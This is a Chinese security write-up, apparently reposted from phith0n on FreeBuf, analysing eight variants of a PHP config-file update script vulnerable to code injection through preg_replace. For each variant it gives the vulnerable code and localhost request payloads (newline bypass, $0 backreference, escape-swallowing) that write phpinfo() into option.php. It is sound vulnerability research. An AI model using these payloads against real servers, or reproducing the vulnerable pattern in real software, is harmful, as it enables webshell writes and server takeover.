**2017年我曾经发过一个经典的配置文件漏洞模型，当时大家真是脑洞大开，想出了很多解决方法。近期看到奇安信发表的一篇文章《[这是一篇“不一样”的真实渗透测试案例分析文章](https://mp.weixin.qq.com/s/8OueE-bEIdkvwPWu3KqrcQ)》提到一个Discuz后台getshell漏洞，也涉及了相关知识，我们来总结一下吧。**

关于本文中所有解决方法的提出者，我会附在文章最后。

## 0x01 基础版

特点：正则贪婪模式、无s单行模式：

    
    
    <?php
    $api = addslashes($_GET['api']);
    $file = file_get_contents('./option.php');
    $file = preg_replace("/\\\$API = '.*';/", "\$API = '{$api}';", $file);
    file_put_contents('./option.php', $file);
    

攻击方法：利用换行符绕过正则，第一次写入webshell，第二次使之逃逸。分别发送如下两个请求，即可写入phpinfo。

> <http://localhost:9090/update.php?api=aaaaa%27>;%0aphpinfo();//
>
> <http://localhost:9090/update.php?api=aaaaa>

## 0x02 单行模式：

基础版使用换行绕过，所以开发者给正则添加了s修饰符，防止换行绕过。

    
    
    <?php
    $api = addslashes($_GET['api']);
    $file = file_get_contents('./option.php');
    $file = preg_replace("/\\\$API = '.*';/s", "\$API = '{$api}';", $file);
    file_put_contents('./option.php', $file);
    

攻击方法：利用正则替换的方式，第二次用$0或\0引入单引号，导致第一次传入的phpinfo逃逸。

> <http://localhost:9090/update.php?api=>;phpinfo();
>
> <http://localhost:9090/update.php?api=>$0

这个方法一样可以攻击剩下几个变种，但有个缺陷是如果配置文件里是define这样还包含其他单引号的语句，将会导致写入的配置文件格式错误，PHP执行报错，熟称的插马插坏了。

## 0x03 基础版非贪婪模式

这个和基础版唯一的差别就是正则匹配变成非贪婪模式：

    
    
    <?php
    $api = addslashes($_GET['api']);
    $file = file_get_contents('./option.php');
    $file = preg_replace("/\\\$API = '.*?';/", "\$API = '{$api}';", $file);
    file_put_contents('./option.php', $file);
    

攻击方法和0x01基础版是相同的。

## 0x04 单行非贪婪模式

正则是非贪婪模式，且增加了s修饰符：

    
    
    <?php
    $api = addslashes($_GET['api']);
    $file = file_get_contents('./option.php');
    $file = preg_replace("/\\\$API = '.*?';/s", "\$API = '{$api}';", $file);
    file_put_contents('./option.php', $file);
    

攻击方法：虽然不能用换行，但因为这里使用了非贪婪模式，所以我们直接传两次即可。

> <http://localhost:9090/update.php?api=aaaa%27>;phpinfo();//
>
> <http://localhost:9090/update.php?api=aaaa>

另外这个也可以利用0x02中的方法getshell。

## 0x05 define基础版

类似于0x01的基础版，将变量定义改成define常量定义：

    
    
    <?php
    $api = addslashes($_GET['api']);
    $file = file_get_contents('./option.php');
    $file = preg_replace("/define\('API', '.*'\);/", "define('API', '{$api}');", $file);
    file_put_contents('./option.php', $file);
    

攻击方法和0x01基础版相同。

## 0x06 define单行版

给define基础版加上s修饰符：

    
    
    <?php
    $api = addslashes($_GET['api']);
    $file = file_get_contents('./option.php');
    $file = preg_replace("/define\('API', '.*'\);/s", "define('API', '{$api}');", $file);
    file_put_contents('./option.php', $file);
    

如果用0x02中的攻击方法，将会导致“插坏”的情况出现，因为引入了无法控制的单引号。

攻击方法：因为preg_replace在替换的时候会吃掉转义符，利用这个特点，即可引入单引号。

直接发送如下请求即可写入phpinfo：

> <http://localhost:9090/update.php?api=aaa>\%27);phpinfo();//

这个方法可以通杀这篇文章里所有的版本（不过需要注意闭合前面的语句，否则会把配置文件插坏），因为不涉及到正则的技巧，只要用到preg_replace就会有这样的问题。

## 0x07 define基础版非贪婪模式

define版本的非贪婪模式，但没有s修饰符：

    
    
    <?php
    $api = addslashes($_GET['api']);
    $file = file_get_contents('./option.php');
    $file = preg_replace("/define\('API', '.*?'\);/", "define('API', '{$api}');", $file);
    file_put_contents('./option.php', $file);
    

可以用0x06的方法（Payload相同），也可以使用0x01中的换行绕过，Payload需要换一下：

> <http://localhost:9090/update.php?api=aaaaa%27>);%0aphpinfo();//
>
> <http://localhost:9090/update.php?api=aaaaa>

同样也可以用0x08的方法，这种写法漏洞相对最多。

## 0x08 define单行非贪婪模式

在0x07的基础上再加上s修饰符：

    
    
    <?php
    $api = addslashes($_GET['api']);
    $file = file_get_contents('./option.php');
    $file = preg_replace("/define\('API', '.*?'\);/s", "define('API', '{$api}');", $file);
    file_put_contents('./option.php', $file);
    

利用方法：可以用0x06的方法，也可以用0x04的方法，只不过要改下Payload。

> <http://localhost:9090/update.php?api=aaaa%27>);phpinfo();//
>
> <http://localhost:9090/update.php?api=aaaa>

## 参考链接

> 0x01、0x03、0x05、0x07解决方法是常用方法，提出者未知。
>
> 0x02解决方法提出者是@Dlive，0x06解决方法提出者是@L3m0n学弟
>
> 0x04、0x08解决方法也是常用方法，也是文章《这是一篇“不一样”的真实渗透测试案例分析文章》里用的方法。

 ***本文作者：[phith0n](https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html)，转载请注明来自FreeBuf.COM**

